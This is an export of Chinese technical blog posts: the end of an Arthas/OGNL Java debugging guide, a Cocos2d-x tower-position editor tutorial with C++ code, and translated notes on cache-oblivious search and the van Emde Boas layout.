shutdownHook=null,</span><br><span class="line">    resourcePatternResolver=@PathMatchingResourcePatternResolver[org.springframework.core.io.support.PathMatchingResourcePatternResolver@7adbd17c],</span><br><span class="line">    lifecycleProcessor=@DefaultLifecycleProcessor[org.springframework.context.support.DefaultLifecycleProcessor@19e8bf29],</span><br><span class="line">    messageSource=@DelegatingMessageSource[org.springframework.context.support.DelegatingMessageSource@6a97f7cc],</span><br><span class="line">    applicationEventMulticaster=@SimpleApplicationEventMulticaster[org.springframework.context.event.SimpleApplicationEventMulticaster@678ca18e],</span><br><span class="line">    applicationListeners=@LinkedHashSet[isEmpty=false;size=1],</span><br><span class="line">    earlyApplicationEvents=null,</span><br><span class="line">    classLoader=@ParallelWebappClassLoader[ParallelWebappClassLoader</span><br><span class="line">  context: ROOT</span><br><span class="line">  delegate: false</span><br><span class="line"><span class="meta prompt_">----------&gt; </span><span class="language-bash">Parent Classloader:</span></span><br><span class="line">java.net.URLClassLoader@5b2133b1</span><br><span class="line">],</span><br><span class="line">    protocolResolvers=@LinkedHashSet[isEmpty=true;size=0],</span><br><span class="line">    resourceCaches=@ConcurrentHashMap[isEmpty=true;size=0],</span><br><span class="line">]</span><br><span class="line">Affect(row-cnt:1) cost in 9 ms.</span><br></pre></td></tr></table></figure></div>

<h3 id="调用context-执行方法"><a href="#调用context-执行方法" class="headerlink" title="调用context 执行方法"></a>调用context 执行方法</h3><div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">ognl &#x27;#context=@com.bj58.bic.ep.rankreview.web.component.SpringContextConfig@applicationContext,</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">context.getBean(@com.bj58.bic.ep.rankreview.web.service.IParticipantOperateService@class).queryByOA(2021120612045375757L, <span class="string">&quot;haoxiaofei&quot;</span>)<span class="string">&#x27; --classLoaderClass   org.apache.catalina.loader.ParallelWebappClassLoader</span></span></span><br></pre></td></tr></table></figure></div>

<h3 id="传复杂对象"><a href="#传复杂对象" class="headerlink" title="传复杂对象"></a>传复杂对象</h3><h4 id="构造器构造"><a href="#构造器构造" class="headerlink" title="构造器构造"></a>构造器构造</h4><div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">ognl &#x27;#obj=new com.shirc.arthasexample.ognl.Shirc(&quot;jjdlmn&quot;,true),&#x27;</span><br></pre></td></tr></table></figure></div>

<h4 id="set-方法构造"><a href="#set-方法构造" class="headerlink" title="set 方法构造"></a>set 方法构造</h4><div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">ognl -x 3 &#x27;#obj=new com.bj58.bsp.v2.user.vo.LoginUserBaseInfo(), #obj.setUsername(&quot;rongjingjing&quot;),</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">springContext=@com.bj58.bic.ep.rankreview.web.component.SpringContextConfig@applicationContext,<span class="comment">#springContext.getBean(&quot;staffManageServiceimpl&quot;)</span></span></span><br><span class="line">.hrbpGetDpts(#obj)&#x27;  --classLoaderClass   org.apache.catalina.loader.ParallelWebappClassLoader</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h4 id="方法返回值作为参数"><a href="#方法返回值作为参数" class="headerlink" title="方法返回值作为参数"></a>方法返回值作为参数</h4><div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">ognl -x 3 &#x27;#obj=new com.bj58.bsp.v2.user.vo.LoginUserBaseInfo(), #obj.setUsername(&quot;lvxiaoke&quot;),</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">springContext=@com.bj58.bic.ep.rankreview.web.component.SpringContextConfig@applicationContext,</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">depts=<span class="comment">#springContext.getBean(&quot;staffManageServiceimpl&quot;).hrbpGetDpts(#obj),</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">insts=@com.bj58.bic.ep.rankreview.web.staffmanage.SMCacheUtil@getInstance(),</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">insts.getAllUsersUnderOrgs(<span class="comment">#depts)&#x27;  --classLoaderClass   org.apache.catalina.loader.ParallelWebappClassLoader</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="调用-集合投影-类似-stream-map-e-gt-e-dptId"><a href="#调用-集合投影-类似-stream-map-e-gt-e-dptId" class="headerlink" title="调用 集合投影 类似 stream().map(e -&gt; e.dptId)"></a>调用 集合投影 类似 stream().map(e -&gt; e.dptId)</h3><div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">ognl -x 1 &#x27;#obj=new com.bj58.bsp.v2.user.vo.LoginUserBaseInfo(), #obj.setUsername(&quot;lvxiaoke&quot;),</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">springContext=@com.bj58.bic.ep.rankreview.web.component.SpringContextConfig@applicationContext,</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">depts=<span class="comment">#springContext.getBean(&quot;staffManageServiceimpl&quot;).hrbpGetDpts(#obj),</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">deptids=<span class="comment">#depts.&#123;dptId&#125;,</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">insts=@com.bj58.bic.ep.rankreview.web.staffmanage.SMCacheUtil@getInstance(),</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">insts.getAllUsersUnderOrgs(<span class="comment">#deptids)&#x27;  --classLoaderClass   org.apache.catalina.loader.ParallelWebappClassLoader</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="调用-静态方法"><a href="#调用-静态方法" class="headerlink" title="调用 静态方法"></a>调用 静态方法</h3><p><code>x</code> 参数指定返回值的可见深度</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">ognl -x 3 &#x27;@com.bj58.bic.ep.rankreview.web.utils.BspHelper@getOrgByOrgId(&quot;201905291539077271da5c&quot;)&#x27;  --classLoaderClass   org.apache.catalina.loader.ParallelWebappClassLoader</span><br></pre></td></tr></table></figure></div>

<h3 id="监控方法调用-可加条件过滤"><a href="#监控方法调用-可加条件过滤" class="headerlink" title="监控方法调用 可加条件过滤"></a>监控方法调用 可加条件过滤</h3><div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">watch com.bj58.bic.ep.rankreview.web.utils.BspHelper getOrgByOrgId <span class="string">&#x27;&#123;params,returnObj,throwExp&#125;&#x27;</span> <span class="string">&#x27;throwExp != null&#x27;</span>  -n 5  -x 3</span> </span><br><span class="line">2021-11-16 14:34:36; [cost=5.313401ms] result=@ArrayList[</span><br><span class="line">    @Object[][</span><br><span class="line">        @String[201706021923030c1a0853],</span><br><span class="line">    ],</span><br><span class="line">    @Organization[</span><br><span class="line">        serialVersionUID=@Long[1],</span><br><span class="line">        id=@String[201706021923030c1a0853],</span><br><span class="line">        orgName=@String[华北一区直销部],</span><br><span class="line">        parentId=null,</span><br><span class="line">        status=@String[1],</span><br><span class="line">        description=@String[华北一区直销部(LongyuLi（李龙雨）)],</span><br><span class="line">        creater=null,</span><br><span class="line">        city=@String[,1],</span><br><span class="line">        parentPath=null,</span><br><span class="line">        orderseq=null,</span><br><span class="line">        orgtype=null,</span><br><span class="line">        orglevel=null,</span><br><span class="line">        hrorgid=null,</span><br><span class="line">        issync=null,</span><br><span class="line">        lastUpdateTime=@Date[2021-05-14 12:31:56,000],</span><br><span class="line">        parentId201408=@String[201712052142005d9e2ab7],</span><br><span class="line">        parentPath201408=@String[2011010814223073b228a5,2014071618493421273d30,201712052142002cb3daad,201712052142005d9e2ab7,201706021923030c1a0853],</span><br><span class="line">        bizArea=null,</span><br><span class="line">        bizLine=null,</span><br><span class="line">        branchCode=@String[],</span><br><span class="line">        lockStatus=null,</span><br><span class="line">        wdOrgId=@String[WD_ORG_2177],</span><br><span class="line">        wdOrgPid=@String[WD_ORG_3492],</span><br><span class="line">        location=@String[北京-东升科技园-58],</span><br><span class="line">        orgSubtype=null,</span><br><span class="line">        managerIdList=null,</span><br><span class="line">    ],</span><br><span class="line">    null,</span><br><span class="line">]</span><br></pre></td></tr></table></figure></div>

<h3 id="cpu过高问题排查"><a href="#cpu过高问题排查" class="headerlink" title="cpu过高问题排查"></a>cpu过高问题排查</h3><p><a class="link"   href="https://github.com/alibaba/arthas/issues/1202" >https://github.com/alibaba/arthas/issues/1202<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h3 id="中文坑"><a href="#中文坑" class="headerlink" title="中文坑"></a>中文坑</h3><p>找个网站，中文转unicode编码即可</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Arthas</tag>
      </tags>
  </entry>
  <entry>
    <title>Cocos2dx 炮台坐标准备</title>
    <url>/2016/11/09/cocos2dx%5B0%5D/</url>
    <content><![CDATA[<p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; background-color: rgb(255, 255, 255);"><strong>cocos2d-x 中自己写的draw函数会自己调用的</strong></p><p style="color: rgb(51, 51, 51); font-size: 14px; background-color: rgb(255, 255, 255);"><strong><span style="font-family:KaiTi\_GB2312;">要把画画的代码放到draw里面不然画不出来的</span></strong></p><p style="color: rgb(51, 51, 51); font-size: 14px; background-color: rgb(255, 255, 255);"><span style="font-family:KaiTi\_GB2312;"><strong>比如说：</strong><span style="font-weight: bold;">将画一条直线放到下面这函数是画不出来的</span></span></p><p style="color: rgb(51, 51, 51); font-size: 14px; background-color: rgb(255, 255, 255);"></p><pre name="code" class="cpp">bool HelloWorld::init(){

<p>。。。。。。</p>
<p>ccDrawLine( ccp(0, 0), ccp(s.width, s.height) );<br>CHECK_GL_ERROR_DEBUG();</p>
<p>。。。。。。</p>
<p>}</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &quot;TowerPosEditorLayer.h&quot;</span><br><span class="line"></span><br><span class="line">TowerPosEditorLayer::TowerPosEditorLayer()&#123;</span><br><span class="line">    m_iCurLevel = 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">TowerPosEditorLayer::~TowerPosEditorLayer()&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bool TowerPosEditorLayer::init()&#123;</span><br><span class="line">    if (!Layer::init())&#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    auto listener = EventListenerTouchOneByOne::create();</span><br><span class="line">    listener-&gt;onTouchBegan = \[\](Touch* touch, Event* event)&#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    listener-&gt;onTouchEnded = \[&amp;\](Touch* touch, Event* event)&#123;</span><br><span class="line">        Point pos = Director::getInstance()-&gt;convertToGL(touch-&gt;getLocationInView());</span><br><span class="line">        editTowerPos(pos);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    _eventDispatcher-&gt;addEventListenerWithSceneGraphPriority(listener, this);</span><br><span class="line"></span><br><span class="line">    return true;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void TowerPosEditorLayer::editTowerPos(Point pos)&#123;</span><br><span class="line">    PosBase* existPos = findExistTowerPos(pos);</span><br><span class="line">    if (existPos != NULL)&#123;</span><br><span class="line">        deleteTowerPos(existPos);</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        createTowerPos(pos);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PosBase* TowerPosEditorLayer::findExistTowerPos(Point pos)&#123;</span><br><span class="line">    for (auto basePos : m_towerPosList)&#123;</span><br><span class="line">        if (basePos-&gt;isClickMe(pos))&#123;</span><br><span class="line">            return basePos;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return NULL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void TowerPosEditorLayer::createTowerPos(Point pos)&#123;</span><br><span class="line">    TowerPos* tPos = TowerPos::create(pos, true);</span><br><span class="line">    this-&gt;addChild(tPos, 10);</span><br><span class="line">    m_towerPosList.pushBack(tPos);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void TowerPosEditorLayer::deleteTowerPos(PosBase* existPos)&#123;</span><br><span class="line">    this-&gt;removeChild(existPos);</span><br><span class="line">    m_towerPosList.eraseObject(existPos);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void TowerPosEditorLayer::deleteAllPos()&#123;</span><br><span class="line">    this-&gt;removeAllChildrenWithCleanup(true);</span><br><span class="line">    m_towerPosList.clear();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">**而放到draw函数就能画出来，也不需要调用**</span><br><span class="line"></span><br><span class="line">void HelloWorld::draw()&#123;</span><br><span class="line"></span><br><span class="line">ccDrawLine( ccp(0, 0), ccp(s.width, s.height) );</span><br><span class="line">CHECK\_GL\_ERROR_DEBUG();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;/pre&gt;&lt;pre name=&quot;code&quot; class=&quot;cpp&quot;&gt;转：</span><br><span class="line"></span><br><span class="line">&lt;pre name=&quot;code&quot; class=&quot;cpp&quot;&gt;3.0之前是visit后就draw，而draw是真正的OpenGL操作。也就是说，每访问一个对象，先计算节点的渲染数据，然后马上渲染。因为节点是按树形结构组织的，如果两个父节点p1和p2的深度分别是10和20，c1是p1的子节点，其深度是30，c2是p2的子节点，其深度是5。则渲染顺序是p1、c1、c2、p2。</span><br><span class="line"></span><br><span class="line">3.0也是在visit后就draw，但是draw并不进行OpenGL操作。3.0抽象了一个RenderCommand，在draw的时候其实是生成一个渲染命令，渲染命令其实就是对渲染所需要的数据的封装。RenderCommand作为基类，只包含了两个成员，一个是命令类型\_type，这个很必要，正是靠这个来获取子类对象的具体类型的，这里没有用运行时类型，应该是考虑到效率；另一个是z深度\_globalOrder，这个也很必要，渲染的时候必然要对节点排序，而z序是唯一的依据。</span><br><span class="line"></span><br><span class="line">3.0包含了以下几个RenderCommand的子类：</span><br><span class="line"></span><br><span class="line">1，CustomCommand：</span><br><span class="line"></span><br><span class="line">顾名思义，是客户自定义的。它没有过多的数据，只有一个std::function&lt;&gt;类型成员func，这个是在节点draw创建CustomCommand的时候传入的参数，而在真正渲染的时候调用的正是这个函数。比如Label，它的draw函数体为：</span><br><span class="line"></span><br><span class="line">void Label::draw()</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    \_customCommand.init(\_globalOrder);</span><br><span class="line"></span><br><span class="line">   \_customCommand.func=CC\_CALLBACK_0(Label::onDraw, this,transform,transformUpdated);</span><br><span class="line"></span><br><span class="line">   render-&gt;addCommand(&amp;_customCommand);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">可见，真正的渲染是在onDraw回调函数中。onDraw的操作和此前版本的draw函数相差不大，都是设置混合方式，使用GLProgram，更新shader的变换矩阵等shader所用到的uniform变量，更新子节点位置（注：因为是批量渲染，这个和此前的CCSpriteBatchNode很相近），调用TextureAtlas::drawQuads();</span><br><span class="line"></span><br><span class="line">使用CustomCommand还有Layer，LableAtlas，LabelBMFont，此外还有RenderTexture，这个比较特殊，下面会说。</span><br><span class="line"></span><br><span class="line">注：估计作者是对所有不太好抽象的渲染节点，就干脆做了一个CustomCommand。</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">#include &quot;TowerPos.h&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">TowerPos::TowerPos()&#123;</span><br><span class="line">    m_pos = Point(0, 0);</span><br><span class="line">    m_isDebug = false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">TowerPos::~TowerPos()&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//要画的东西丢给draw，draw会调用onDraw来绘制，该函数会自动被调用</span><br><span class="line">//renderer渲染器，  draw函数固定重写，决定画啥的还是onDraw</span><br><span class="line">void TowerPos::draw(Renderer* renderer, const kmMat4 &amp;transform, bool transformUpdate)&#123;</span><br><span class="line">    if (m_isDebug)&#123;</span><br><span class="line">        \_customCommand.init(\_globalZOrder);</span><br><span class="line">        \_customCommand.func = CC\_CALLBACK_0(TowerPos::onDraw, this, transform, transformUpdate);</span><br><span class="line">        renderer-&gt;addCommand(&amp;_customCommand);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void TowerPos::onDraw(const kmMat4 &amp;transform, bool transformUpdate)&#123;</span><br><span class="line">    //开始绘制</span><br><span class="line">    kmGLPushMatrix();</span><br><span class="line">    kmGLLoadMatrix(&amp;transform);</span><br><span class="line">    //笔刷厚度</span><br><span class="line">    glLineWidth(5.0f);</span><br><span class="line"></span><br><span class="line">    Point srcPos = Point(m\_pos.x - RADIUS, m\_pos.y + RADIUS);</span><br><span class="line">    Point destPos = Point(m\_pos.x + RADIUS, m\_pos.y - RADIUS);</span><br><span class="line">    //这函数负责各种画图</span><br><span class="line">    DrawPrimitives::drawRect(srcPos, destPos);</span><br><span class="line"></span><br><span class="line">    glLineWidth(1);</span><br><span class="line">    kmGLPopMatrix();//结束绘制</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bool TowerPos::isClickMe(Point pos)&#123;</span><br><span class="line">    Point srcPos = Point(m\_pos.x - RADIUS, m\_pos.y + RADIUS);</span><br><span class="line">    Point destPos = Point(m\_pos.x + RADIUS, m\_pos.y - RADIUS);</span><br><span class="line">    </span><br><span class="line">    if (pos.x &gt;= srcPos.x &amp;&amp; pos.x &lt;= destPos.x &amp;&amp; pos.y &lt;= srcPos.y &amp;&amp; pos.y &gt;= destPos.y)&#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">TowerPos* TowerPos::create(Point pos)&#123;</span><br><span class="line">    TowerPos* tPos = new TowerPos();</span><br><span class="line"></span><br><span class="line">    if (tPos &amp;&amp; tPos-&gt;init(pos))&#123;</span><br><span class="line">        tPos-&gt;autorelease();</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        CC\_SAFE\_DELETE(tPos);</span><br><span class="line">    &#125;</span><br><span class="line">    return tPos;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">TowerPos* TowerPos::create(Point pos, bool isDebug)&#123;</span><br><span class="line">    TowerPos* tPos = new TowerPos();</span><br><span class="line"></span><br><span class="line">    if (tPos &amp;&amp; tPos-&gt;init(pos, isDebug))&#123;</span><br><span class="line">        tPos-&gt;autorelease();</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        CC\_SAFE\_DELETE(tPos);</span><br><span class="line">    &#125;</span><br><span class="line">    return tPos;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bool TowerPos::init(Point pos)&#123;</span><br><span class="line">    bool bRet = false;</span><br><span class="line"></span><br><span class="line">    do &#123;</span><br><span class="line">        CC\_BREAK\_IF(!PosBase::init(pos));</span><br><span class="line">        bRet = true;</span><br><span class="line">    &#125; while (0);</span><br><span class="line">    return bRet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bool TowerPos::init(Point pos, bool isDebug)&#123;</span><br><span class="line">    bool bRet = false;</span><br><span class="line"></span><br><span class="line">    do &#123;</span><br><span class="line">        CC\_BREAK\_IF(!PosBase::init(pos, isDebug));</span><br><span class="line">        bRet = true;</span><br><span class="line">    &#125; while (0);</span><br><span class="line">    return bRet;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="toplist-生成"><a href="#toplist-生成" class="headerlink" title="toplist 生成"></a>toplist 生成</h2><p>如何生成plist，xml文件</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">void TowerPosEditorLayer::outputPosToPlistFile()&#123;</span><br><span class="line">    String* sTowerPosPath = String::createWithFormat(&quot;tollgate/towerPos_level_%d.plist&quot;, m_iCurLevel);</span><br><span class="line">    outputPosToPilistFile(m_towerPosList, sTowerPosPath-&gt;getCString());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void TowerPosEditorLayer::outputPosToPilistFile(Array* posList, const char* sFilePath)&#123;</span><br><span class="line">    FILE* file = fopen(sFilePath, &quot;w&quot;);</span><br><span class="line"></span><br><span class="line">    fprintf(file, &quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;UTF-8\&quot;?&gt;\n&quot;);</span><br><span class="line">    fprintf(file, &quot;&lt;!DOCTYPE plist PUBLIC\&quot;-//Apple//DTD PLIST 1.0//EN\&quot;\&quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd\&quot;&gt;\n&quot;);</span><br><span class="line"></span><br><span class="line">    fprintf(file, &quot;&lt;plist version=\&quot;1.0\&quot;&gt;\n&quot;);</span><br><span class="line">    fprintf(file, &quot;&lt;array&gt;\n&quot;);</span><br><span class="line"></span><br><span class="line">    Object* obj = NULL;</span><br><span class="line">    PosBase* posBase = NULL;</span><br><span class="line">    CCARRAY_FOREACH(posList, obj)&#123;</span><br><span class="line">        posBase = dynamic_cast&lt;PosBase*&gt;(obj);</span><br><span class="line"></span><br><span class="line">        if (posBase != NULL)&#123;</span><br><span class="line">            fprintf(file, &quot;    &lt;dict&gt;\n&quot;);</span><br><span class="line"></span><br><span class="line">            fprintf(file, &quot;    &lt;key&gt;x&lt;/key&gt;\n&quot;);</span><br><span class="line">            fprintf(file, &quot;    &lt;integer&gt;%.0f&lt;/integer&gt;\n&quot;, posBase-&gt;getPos().x);</span><br><span class="line"></span><br><span class="line">            fprintf(file, &quot;    &lt;key&gt;y&lt;/key&gt;\n&quot;);</span><br><span class="line">            fprintf(file, &quot;    &lt;integer&gt;%.0f&lt;/integer&gt;\n&quot;, posBase-&gt;getPos().y);</span><br><span class="line"></span><br><span class="line">            fprintf(file, &quot;    &lt;/dict&gt;\n&quot;);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fprintf(file, &quot;&lt;/array&gt;\n&quot;);</span><br><span class="line">    fprintf(file, &quot;&lt;/plist&gt;\n&quot;);</span><br><span class="line"></span><br><span class="line">    fclose(file);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>]]></content>
      <categories>
        <category>游戏</category>
      </categories>
      <tags>
        <tag>cocos</tag>
        <tag>cocos2dx</tag>
        <tag>game</tag>
      </tags>
  </entry>
  <entry>
    <title>（译）缓存参数无关算法</title>
    <url>/2020/07/05/cache-oblivious-algo/</url>
    <content><![CDATA[<h2 id="缓存参数无关算法-笔记"><a href="#缓存参数无关算法-笔记" class="headerlink" title="缓存参数无关算法 笔记"></a>缓存参数无关算法 笔记</h2><p>参考链接：</p>
<p><a class="link"   href="https://jiahai-feng.github.io/posts/cache-oblivious-algorithms/" >Cache Oblivious Introduce blog<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="http://erikdemaine.org/papers/BRICS2002/paper.pdf" >Cache Oblivious paper<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>假设 硬盘 存在 <code>M</code> bits，以 <code>B</code> bits 作为分页大小，缓存按页加载，介绍相关的缓存参数无关的命中算法，这里的参数指 B</p>
<p>转化问题： <code>N</code> 个整数， 按 <code>B</code> 个 一页，求最快找到 <code>N</code> 所在页的算法</p>
<h3 id="算法低效但是参数无关-二分查找"><a href="#算法低效但是参数无关-二分查找" class="headerlink" title="算法低效但是参数无关: 二分查找"></a>算法低效但是参数无关: 二分查找</h3><p>假设 <code>N</code> 个整数本身是有序的，采用方法： 总长 <code>O(N)</code> 所以计算查找次数为 <code>O(logN -logB)</code>，因为二分范围降到 <code>B</code> 时直接取出该页</p>
<p>参数无关是因为该算法并不知晓 <code>B</code> 的值，它只是按照标准的二分查找去搜（调用方是缓存，它load <code>B</code> 页时会去查到真正的所需值来停止二分，这对二分算法本身不可见）</p>
<h3 id="非低效，但是参数相关-B-Tree"><a href="#非低效，但是参数相关-B-Tree" class="headerlink" title="非低效，但是参数相关: B-Tree"></a>非低效，但是参数相关: B-Tree</h3><p>假设一开始知晓 <code>B</code> 的值，那么就可以达到 <code>O(log[B]N)</code> (中括号代表底数)，具体如下</p>
<p>首先把 list 转成 <code>B</code> 树：也就是说每个节点有 <code>B</code> 个元素，统一节点的元素是有序的，不同节点之间是整体有序的，每个节点上 <code>B</code> 个元素会产生 <code>B+1</code> 个分支，这样生成树之后，每下降一层间隔就会减少 <code>B</code> 倍(也就是砍掉了其他分支，相当于树的第二层取了节点作为新树), 那时间复杂度就是 <code>O(logN/logB) = O(log[B]N)</code></p>
<h3 id="非低效且参数无关算法-van-Emde-Boas-layout"><a href="#非低效且参数无关算法-van-Emde-Boas-layout" class="headerlink" title="非低效且参数无关算法: van Emde Boas layout"></a>非低效且参数无关算法: van Emde Boas layout</h3><p>传统的二分搜索树的特性决定了每次搜索都是 <code>O(logN - logB)</code>，这显然不合期望，<code>van Emde Boas layout</code> 算法使用了一种很好的递归方式来排序，从而使得每次分页的查询都包含接下来可能要查的几个节点，从而提高命中率。</p>
<h3 id="简洁概念"><a href="#简洁概念" class="headerlink" title="简洁概念"></a>简洁概念</h3>

<p>假设存在树高 <code>H = 2^K</code>.</p>
<h3 id="概念展开"><a href="#概念展开" class="headerlink" title="概念展开"></a>概念展开</h3><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/07/05/cache-oblivious-algo/veb-step0.png"
                      class="" title="完全二叉树"
                >


<p>假设现在有一棵完全二叉树 <code>H = 2^K</code>，以 <code>x</code> 作为 <code>root</code> 节点，而我们的目的是计算出二叉树顶点的一种排列： <code>L(x, k)</code>  </p>
<ol>
<li><p>横切 2^(k-1) 和 2^(k-1) + 1 两层之间的枝，然后我们将得到这样的结果</p>
<ul>
<li><code>n=2^(h/2)</code> 个 <code>2^(K-1)</code> 高 的小完全二叉树这些二叉树是从上面的节点断开后生成的，分别以 <code>l1..ln</code> 作为根节点。</li>
<li>以及以 <code>root</code> 作为根节点的 <code>2^(K-1)</code> 高的根树。</li>
</ul>
</li>
</ol>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/07/05/cache-oblivious-algo/veb-step1.png"
                      class="" title="横切一刀"
                >

<ol start="2">
<li><p>以 <code>x</code> 根节点和 <code>k</code> 值得到的这 <code>n+1</code> 个 BST的调用函数 我们称为 <code>L(x, k)</code></p>
</li>
<li><p>将它们排列好后返回（顺序不重要）</p>
</li>
</ol>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/07/05/cache-oblivious-algo/veb-step2.png"
                      class="" title="L(x，k)"
                >

<h3 id="Sierpinski-triangles-atoms-and-time"><a href="#Sierpinski-triangles-atoms-and-time" class="headerlink" title="Sierpinski triangles, atoms and time"></a>Sierpinski triangles, atoms and time</h3><p>为了更好的解释接下来如何实现这种构造，首先给出一个直观的演示，它很像 Sierpinski 三角，如下：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/07/05/cache-oblivious-algo/sierpinski-triangle-evolution.png"
                      class="" title="L(x，k)"
                >

<p>同过 Sierpinski 三角 我们大致能得到一种限制深度的递归，这使得这个递归更加偏像 BFS 而不是 DFS。</p>
<p>具体一点来说，我们引入 <code>t</code> 变量作为限制的递归深度，并引入概念 <code>atom</code> 代表递归深度为 <code>t</code> 时的子树单元。举例来说，递归深度 <code>t</code> 为 0 的时候，<code>atom</code> 是整个树。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/07/05/cache-oblivious-algo/veb-step0.png"
                      class="" title="t&#x3D;0"
                >

<p>接下来，当 <code>t = 1</code> 我们得到上面提到过的 <code>2^(K-1)</code> 高的子树，这时的 <code>atoms</code> 指的就是这些子树。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/07/05/cache-oblivious-algo/veb-step1.png"
                      class="" title="t&#x3D;1"
                >

<p>继续提高 <code>t</code> 递归深度，得到一批 <code>2^(K-2)</code> 的 atoms。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/07/05/cache-oblivious-algo/veb-recur.png"
                      class="" title="t&#x3D;1"
                >

<p>随着递归深度的提高最终 <code>atoms</code> 会变成最小的子树单元也就是一个个独立的节点。这一过程表明我们通过限制 <code>t</code> 即递归的深度可以得到不同程度精细的 <code>atoms</code>，综上可以获取如下推论</p>
<blockquote>
<p>In the final layout, we can choose any resolution to look at the layout. All vertices in any atom at this resolution will be in a contiguous segment.</p>
</blockquote>
